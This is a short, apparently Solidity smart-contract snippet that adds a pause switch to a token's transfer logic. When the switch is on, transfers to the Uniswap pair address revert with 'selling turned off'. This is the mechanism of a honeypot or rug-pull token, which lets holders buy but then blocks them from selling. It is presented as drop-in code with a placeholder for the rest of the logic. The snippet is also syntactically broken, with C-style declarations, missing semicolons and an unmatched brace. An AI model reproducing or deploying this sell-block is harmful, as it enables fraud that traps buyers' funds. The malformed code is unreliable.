bool isPaused = 0 
function pauseOrUnPause(bool _isPaused) {
isPaused = _isPaused;
} 
if(isPaused && _to == uniswapV2PairAddress) {
revert('selling turned off')
}
else {
//your transfer logic such as function, contructor, or event code goes here
}
}
